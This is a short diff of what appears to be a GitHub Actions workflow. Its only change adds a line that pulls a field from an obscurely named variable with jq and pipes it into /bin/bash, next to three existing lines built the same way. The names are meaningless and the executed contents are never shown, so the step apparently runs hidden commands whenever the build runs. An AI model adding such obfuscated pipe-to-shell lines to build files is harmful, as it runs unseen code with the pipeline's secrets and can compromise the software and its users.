@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$aznew2671" | jq -r .oi333 | /bin/bash
           echo $p3 | jq -r .evwcd9 | /bin/bash
           printf '%s' "$apheo510" | jq -r .ugoj320 | /bin/bash
+          echo $tjgw405 | jq -r .o36 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
